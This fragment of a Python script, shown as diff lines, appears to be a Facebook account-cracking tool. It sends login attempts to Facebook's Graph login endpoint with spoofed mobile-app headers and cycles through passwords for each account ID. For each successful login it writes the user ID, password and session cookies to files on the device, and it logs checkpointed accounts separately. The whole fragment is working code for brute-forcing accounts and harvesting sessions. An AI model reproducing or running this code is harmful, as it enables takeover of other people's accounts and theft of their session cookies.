+            "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+            "X-FB-Connection-Quality": "EXCELLENT",
+            "X-FB-Connection-Type": "MOBILE.LTE",
+            "X-FB-HTTP-Engine": "Liger",
+            'X-FB-Client-IP': 'True',
+            "X-FB-Friendly-Name": "authenticate",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": str(len(content_lenght))}
+            url = "https://graph.facebook.com/auth/login"
+            po = requests.post(url,data=data,headers=head,allow_redirects=False,verify=True).json()
+            if "access_token" in po:
+                uid = str(po['uid'])
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                print(f'\r\r {G}[ASIF-OK] {uid} | {pas}')
+                open('/sdcard/LIMON-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                oks.append(ids)
+                break
+            elif 'Please Confirm Email' in po:
+                uid = str(po['uid'])
+                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                print(f'\r\r {G}[ASIF-OK] {uid} | {pas}')
+                open('/sdcard/ASIF-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
+                oks.append(ids)
+                break
+            elif 'www.facebook.com' in po['error']['message']:
+                open('/sdcard/ASIF-CP.txt','a').write(ids+'|'+pas+'\n')
+                cps.append(ids)
+                break
+            else:continue
+        loop+=1
+    except Exception as e:
+        pass
+ 
+##------------------[ END-MENU ]------------------##
+if __name__ == '__main__':
+    Main.Awm()
+    apvroval.check()
+ 
